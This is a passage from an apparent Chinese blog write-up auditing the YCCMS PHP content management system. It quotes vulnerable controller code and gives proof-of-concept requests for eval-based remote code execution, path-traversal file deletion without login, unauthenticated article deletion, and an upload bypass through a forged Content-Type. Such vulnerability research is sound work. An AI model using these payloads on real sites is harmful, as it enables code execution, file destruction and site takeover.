class="hljs-comment">//上传目录的跟路径</span><br>			<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<span class="hljs-comment">//遍历提交的图片名</span><br>				<span class="hljs-variable">$_filePath</span>=<span class="hljs-variable">$_fileDir</span>.<span class="hljs-variable">$_value</span>;<span class="hljs-comment">//构造文件路径，这里的路径可以拼接，且 $_value 是可控的，造成漏洞</span><br>				<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filePath</span>))&#123;<span class="hljs-comment">//unlink() 删除文件</span><br>					tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;图片删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br>				&#125;<span class="hljs-keyword">else</span>&#123;<br>					<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:?a=pic&#x27;</span>);<br>				&#125;<br>			&#125;			<br>		&#125;	<br>	&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="SearchAction-class-php"><a href="#SearchAction-class-php" class="headerlink" title="SearchAction.class.php"></a>SearchAction.class.php</h4><p>搜索控制器</p>
+<p>功能：用于前端页面的内容搜索</p>
+<h4 id="SystemAction-class-php"><a href="#SystemAction-class-php" class="headerlink" title="SystemAction.class.php"></a>SystemAction.class.php</h4><p>系统设置控制器</p>
+<p>功能：后台系统信息、设置首页文字内容</p>
+<h2 id="记一些知识点、函数"><a href="#记一些知识点、函数" class="headerlink" title="记一些知识点、函数"></a>记一些知识点、函数</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/phpper/p/8976304.html">PHP 中 private、public、protected区别</a></p>
+<p><a target="_blank" rel="noopener" href="https://jueee.github.io/2020/10/2020-10-20-PHP%E4%B9%8BSmarty%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%BD%BF%E7%94%A8%E6%B1%87%E6%80%BB/">PHP 之 Smarty 模板引擎使用汇总</a></p>
+<p>Smarty 是 PHP 的一个引擎模板，可以将 MVC 中的 C 分离出来。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50602266/article/details/121910781">JavaScript之Ajax</a></p>
+<blockquote>
+<p>AJAX (Asynchronous JavaScript and XML) 异步 JS 和 XML，在不刷新整个页面的情况下，与服务器交换数据的技术。</p>
+</blockquote>
+<h3 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a>htmlspecialchars()</h3><blockquote>
+<p><code>htmlspecialchars()</code> 函数把预定义的字符转换为 HTML 实体。</p>
+<p>预定义的字符是：</p>
+<ul>
+<li>&amp; （和号）成为 &amp;</li>
+<li>“ （双引号）成为 “</li>
+<li>‘ （单引号）成为 ‘</li>
+<li>&lt; （小于）成为 &lt;</li>
+<li>&gt; （大于）成为 &gt;</li>
+</ul>
+</blockquote>
+<h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><p><a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-47137">YCCMS存在文件上传漏洞（CNVD-2021-47137）</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-46794">YCCMS存在文件上传漏洞（CNVD-2021-46794）</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-46795">YCCMS存在逻辑缺陷漏洞</a></p>
+<h3 id="RCE漏洞复现"><a href="#RCE漏洞复现" class="headerlink" title="RCE漏洞复现"></a>RCE漏洞复现</h3><p>根据Action.class.php审计，发现<code>method_exists($this, $_m) ? eval(&#39;$this-&gt;&#39;.$_m.&#39;();&#39;) : $this-&gt;index();</code></p>
+<p>eval() 可以执行任意字符串形式的 PHP 代码，此处通过搜索发现 run()函数 出现在 config&#x2F;run.inc.php 这个文件，存在rce</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//	config/run.inc.php  </span><br><span class="hljs-title class_">Factory</span>::<span class="hljs-title function_ invoke__">setAction</span>()-&gt;<span class="hljs-title function_ invoke__">run</span>();<br><br>-&gt;<span class="hljs-title function_ invoke__">setAction</span>()<br><br><span class="hljs-comment">//	public/class/Factory.class.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Factory</span></span>&#123;<br>    ...<br><span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setAction</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$_a</span>=<span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">getA</span>();<span class="hljs-comment">//$_a 是get传参，可控变量</span><br>		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_a</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;nav&#x27;</span>, <span class="hljs-string">&#x27;article&#x27;</span>,<span class="hljs-string">&#x27;backup&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;link&#x27;</span>,<span class="hljs-string">&#x27;pic&#x27;</span>,<span class="hljs-string">&#x27;search&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;xml&#x27;</span>,<span class="hljs-string">&#x27;online&#x27;</span>))) &#123;<br>			<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br>				<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.<span class="hljs-string">&#x27;?a=login&#x27;</span>);<br>			&#125;  <br>		&#125;<br>		<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/controller/&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action.class.php&#x27;</span>)) <span class="hljs-variable">$_a</span> = <span class="hljs-string">&#x27;Login&#x27;</span>;<span class="hljs-comment">//ucfirst(), 将字符串首字母转化为大写，file_exists() 函数检查文件是否存在，如果文件不存在就回退为 Login 控制器</span><br>		<span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;self::$_obj = new &#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action();&#x27;</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$_obj</span>;<br>	&#125;<br>    ...<br>&#125;<br>	<br></code></pre></td></tr></table></figure>
+
+
+
+<p>1、绕过 file_exists（）</p>
+<p>这个函数在进行检查时，比如&#x2F;controller&#x2F;admin;&#x2F;..&#x2F;，函数允许路径中有一些特殊字符，并且遇到&#x2F;..&#x2F;会返回到上级目录，可以利用这个绕过 file_exists（）函数检查。</p>
+<p>那么我们构造poc:<code>Factory();phpinfo();//../</code></p>
+<p>2、入口点</p>
+<p>调用Factory() 的入口点在 Factory::setAction()-&gt;run(); 这里，在admin&#x2F;index.php 这个文件中得知，它包含了&#x2F;config&#x2F;run.inc.php，可以利用</p>
+<p>3、POC</p>
+<p><code>/admin?a=Factory();phpinfo();//../</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950740.png" srcset="/img/loading.gif" lazyload alt="20250710234248614"></p>
+<h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><p>根据审计PicAction.class.php时遇到的delall()函数，无验证造成的任意文件删除漏洞，进行复现。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//删除图片，依旧没有验证用户</span><br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br>			<span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>]))<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何图片!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<span class="hljs-comment">//是否选择图片，若为空，layer_alert 弹窗提示7并跳回 &#x27;?a=pic&#x27;</span><br>			<span class="hljs-variable">$_fileDir</span>=ROOT_PATH.<span class="hljs-string">&#x27;/uploads/&#x27;</span>;<span class="hljs-comment">//上传目录的跟路径</span><br>			<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<span class="hljs-comment">//遍历提交的图片名</span><br>				<span class="hljs-variable">$_filePath</span>=<span class="hljs-variable">$_fileDir</span>.<span class="hljs-variable">$_value</span>;<span class="hljs-comment">//构造文件路径，这里的路径可以拼接，且 $_value 是可控的，造成漏洞</span><br>				<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filePath</span>))&#123;<span class="hljs-comment">//unlink() 删除文件</span><br>					tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;图片删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br>				&#125;<span class="hljs-keyword">else</span>&#123;<br>					<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:?a=pic&#x27;</span>);<br>				&#125;<br>			&#125;<br>					<br>		&#125;<br>		<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>来到对应的功能点：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950634.png" srcset="/img/loading.gif" lazyload alt="20250712193547260"></p>
+<p>先给 upload 随便上传一张图片</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950799.png" srcset="/img/loading.gif" lazyload alt="20250712193717272"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950970.png" srcset="/img/loading.gif" lazyload alt="20250712193754284"></p>
+<p>删除，进行抓包：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950144.png" srcset="/img/loading.gif" lazyload alt="20250712193827895"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951787.png" srcset="/img/loading.gif" lazyload alt="20250712193843074"></p>
+<p>URL编码：<code>pid%5B0%5D=1.png&amp;chkall=on&amp;send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87</code></p>
+<p>解码：</p>
+<p><code>pid[0]=1.png&amp;chkall=on&amp;send=删除选中图片</code></p>
+<p><code>chkall=on</code>是一个复选框</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951051.png" srcset="/img/loading.gif" lazyload alt="20250712194432977"></p>
+<p>可以看到只要在pid后的文件名进行路径拼接就可以跳到任意目录去删除文件</p>
+<p>接下来就可以根据上面的数据构造POC：</p>
+<p><code>pid[0]=/../1.txt&amp;chkall=on&amp;send=删除选中图片</code></p>
+<p><code>pid%5B0%5D=/../1.txt&amp;chkall=on&amp;send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87</code></p>
+<p>路由：admin&#x2F;?a&#x3D;pic&amp;m&#x3D;delall</p>
+<p>在根目录准备一个1.txt</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951601.png" srcset="/img/loading.gif" lazyload alt="20250712194601104"></p>
+<p>退出登录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951683.png" srcset="/img/loading.gif" lazyload alt="20250712194749344"></p>
+<p>POST传参：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951643.png" srcset="/img/loading.gif" lazyload alt="20250712195154540"></p>
+<p>上图的浏览器删不掉，换了一个成功了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951397.png" srcset="/img/loading.gif" lazyload alt="20250712195540507"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952634.png" srcset="/img/loading.gif" lazyload alt="20250712195612613"></p>
+<h3 id="任意文章-文件（no）删除"><a href="#任意文章-文件（no）删除" class="headerlink" title="任意文章&#x2F;文件（no）删除"></a>任意文章&#x2F;文件（no）删除</h3><p>这里想到审计ArticleAction.class.php时也有delall()函数，看看这里有没有文章删除漏洞。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//删除单个文章</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delete</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;<br>			<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>			<span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<br>			<span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<br>			<span class="hljs-keyword">if</span>(<span class="hljs-variable">$html</span>==<span class="hljs-literal">NULL</span>)&#123;<br>				<span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;0.html&#x27;</span>;<br>			&#125;<br>			<span class="hljs-comment">//先删除静态文件</span><br>			<span class="hljs-keyword">if</span>(tool::<span class="hljs-title function_ invoke__">delete_file</span>(<span class="hljs-variable">$html</span>))&#123;<br>				<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">delete_article</span>())&#123;<br>					<span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertLocation</span>(<span class="hljs-literal">null</span>, tool::<span class="hljs-title function_ invoke__">getPrevPage</span>());<br>				&#125;<span class="hljs-keyword">else</span>&#123;<br>					tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;删除失败!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">7</span>);<br>				&#125;<br>			&#125;<br>		&#125;<br>	&#125;<br><span class="hljs-comment">//删除多个文章</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br>			<span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>])) tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何内容!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">7</span>);<br>			<span class="hljs-comment">//$this-&gt;_model-&gt;id=implode(&#x27;,&#x27;,$_POST[&#x27;showid&#x27;]);</span><br>			<span class="hljs-comment">//echo $this-&gt;_model-&gt;id;</span><br>			<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<br>				<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_value</span>;<br>				<span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<br>				<span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<br>				<span class="hljs-keyword">if</span>(<span class="hljs-variable">$html</span>==<span class="hljs-literal">NULL</span>)&#123;<br>					<span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;0.html&#x27;</span>;		<br>				&#125;<br>				<span class="hljs-comment">//先删除静态文件</span><br>				<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br>				<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br>					tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;静态文件删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">5</span>);<br>				&#125;<br>				&#125;<br>				<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">delete_article</span>();<br>				<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.tool::<span class="hljs-title function_ invoke__">getPrevPage</span>());<br>			&#125;<br>		&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="delete"><a href="#delete" class="headerlink" title="delete()"></a>delete()</h4><p>GET传参，</p>
+<p>找到一篇文章的id</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952850.png" srcset="/img/loading.gif" lazyload alt="20250712200511140"></p>
+<p>构造POC：<code>admin/?a=article&amp;m=delete&amp;id=2450</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952517.png" srcset="/img/loading.gif" lazyload alt="20250712200604332"></p>
+<p>执行后发现这篇文章被删除了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952547.png" srcset="/img/loading.gif" lazyload alt="20250712200619491"></p>
+<h4 id="delall"><a href="#delall" class="headerlink" title="delall()"></a>delall()</h4><p>功能点：此处多选删除</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952341.png" srcset="/img/loading.gif" lazyload alt="20250712201015073"></p>
+<p>抓包：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952688.png" srcset="/img/loading.gif" lazyload alt="20250712201031989"></p>
+<p><code>showid%5B%5D=2449&amp;showid%5B%5D=2448&amp;showid%5B%5D=2447&amp;showid%5B%5D=2446&amp;chkall=on&amp;send=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4</code></p>
+<p>同样的，构造POC：</p>
+<p><code>showid%5B%5D=%2F..%2F1.txt&amp;showid%5B%5D=2448&amp;showid%5B%5D=2447&amp;showid%5B%5D=2446&amp;chkall=on&amp;send=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4</code></p>
+<p>路由：admin&#x2F;?a&#x3D;article&amp;m&#x3D;delall</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080953834.png" srcset="/img/loading.gif" lazyload alt="20250712201614722"></p>
+<p>但是只删除了文章并没有删除1.txt ？？</p>
+<p>再认真分析一遍：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<br>				<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_value</span>;<span class="hljs-comment">//获取文章id</span><br>				<span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<span class="hljs-comment">//数据库查询</span><br>				<span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<span class="hljs-comment">//从数据库中获取 HTML</span><br></code></pre></td></tr></table></figure>
+
+<p>直接传递<code>/../1.txt</code>作为ID值，系统会将<code>/../1.txt</code>当作文章ID去数据库查询，显然这个ID不存在</p>
+<p>想要利用这里的漏洞，只能去更改数据库中HTML的内容，</p>
+<p>添加、修改、删除都进行了用户验证，所以这个也不算一个漏洞了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;html_temp&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;html_temp&#x27;</span>]=<span class="hljs-variable">$_art</span>[<span class="hljs-number">0</span>]-&gt;html;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p>controller&#x2F;CallAction.class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//处理上传图片</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upLoad</span>(<span class="hljs-params"></span>) </span>&#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>])) &#123;<br>			<span class="hljs-variable">$_logoupload</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogoUpload</span>(<span class="hljs-string">&#x27;pic&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;MAX_FILE_SIZE&#x27;</span>]);<br>			<span class="hljs-variable">$_path</span> = <span class="hljs-variable">$_logoupload</span>-&gt;<span class="hljs-title function_ invoke__">getPath</span>();<br>			<span class="hljs-variable">$_img</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>(<span class="hljs-variable">$_path</span>);<br>			<span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">xhImg</span>(<span class="hljs-number">960</span>,<span class="hljs-number">0</span>);<br>			<span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">out</span>();<br>			<span class="hljs-comment">//echo $_path;</span><br>			<span class="hljs-variable">$_logoupload</span>-&gt;<span class="hljs-title function_ invoke__">alertOpenerClose</span>(<span class="hljs-string">&#x27;图片上传成功！&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>.<span class="hljs-variable">$_path</span>);<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;警告：文件过大或者其他未知错误导致浏览器崩溃！&#x27;</span>);<br>		&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//构造方法，初始化</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$_file</span>,<span class="hljs-variable">$_maxsize</span></span>) </span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;error = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;error&#x27;</span>];<br>		<span class="hljs-variable language_">$this</span>-&gt;maxsize = <span class="hljs-variable">$_maxsize</span> / <span class="hljs-number">1024</span>;<br>		<span class="hljs-variable language_">$this</span>-&gt;type = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br>		<span class="hljs-variable language_">$this</span>-&gt;path = ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.UPLOGO;<br>		<span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>		<span class="hljs-variable language_">$this</span>-&gt;tmp = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>		<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkError</span>();<br>		<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkType</span>();<br>		<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkPath</span>();<br>		<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">moveUpload</span>();<br>	&#125;<br>	<br></code></pre></td></tr></table></figure>
+
+<p>根据Content-Type的值来判断是否是图片格式，只要Content-Type是这两种类型就可以，那直接伪造Content-Type就可以了</p>
+<h3 id="任意文件上传-2"><a href="#任意文件上传-2" class="headerlink" title="任意文件上传-2"></a>任意文件上传-2</h3><p>controller&#x2F;CallAction.class.php</p>
